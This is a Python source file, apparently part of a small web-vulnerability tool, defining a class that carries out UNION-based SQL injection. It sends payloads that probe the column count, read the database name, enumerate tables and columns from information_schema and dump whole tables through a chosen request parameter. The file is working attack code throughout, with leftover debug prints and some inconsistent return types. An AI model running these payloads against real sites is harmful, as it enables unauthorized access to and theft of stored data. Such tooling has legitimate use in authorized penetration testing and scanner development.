from core.requester import Requester
from core.analyzer import Analyzer
from utils.logger import Logger


class UnionInjector:
	"""
	`'`: closes the string
	Ex.: SELECT * FROM users WHERE id = '$id';
		=> SELECT * FROM users WHERE id = '' UNION SELECT...;

	UNION SELECT ... is appended to original query

	`--`: comments out the trailing `'` (the second one in `'$id'`)
	"""

	def __init__(self, requester: Requester, analyzer: Analyzer):
		self.requester = requester
		self.analyzer = analyzer

	def find_column_count(self, url: str, param: str) -> int | None:
		err_response = ""
		index = 0
		for count in range(0, 20):
			nulls = ",".join(["NULL"] * count)

			payload = f"-1 UNION SELECT {nulls} --"

			response = self.requester.send(
				url,
				{param: payload}
			)

			if index == 0:
				err_response = response
				print("ddddddddd")
			else:
				print("dfffffffdd")


			if (not self.analyzer.has_sql_error(response) or
				self.analyzer.responses_differ(err_response, response)):
				return count + 1
			index += 1

		return None

	def test_db_name(self, url: str, param: str) -> str:
		payload = "' UNION SELECT database() -- "

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def test_tables(self, url: str, param: str) -> str:
		column_count = self.find_column_count(url, param)
		Logger.debug(f"Column count: {column_count}")
	
		payload = (
			"-1 UNION SELECT table_name FROM information_schema.tables"
			#"' UNION SELECT table_name "
			#"FROM information_schema.tables -- "
	)

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def test_columns(self, url: str, param: str, table: str) -> str:
		payload = (
			f"' UNION SELECT column_name "
			f"FROM information_schema.columns "
			f"WHERE table_name='{table}' -- "
		)

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def dump_table(self, url: str, param: str, table: str, columns: str) -> str:
		payload = (
			f"' UNION SELECT {columns} "
			f"FROM {table} -- "
		)

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def _extract_text(self, body: str) -> str:
		"""
		Very simple extractor:
		keeps only useful lines.
		"""
		lines = body.split("\n")

		cleaned = [
			line.strip()
			for line in lines
			if line.strip() and "<" not in line
		]

		return cleaned
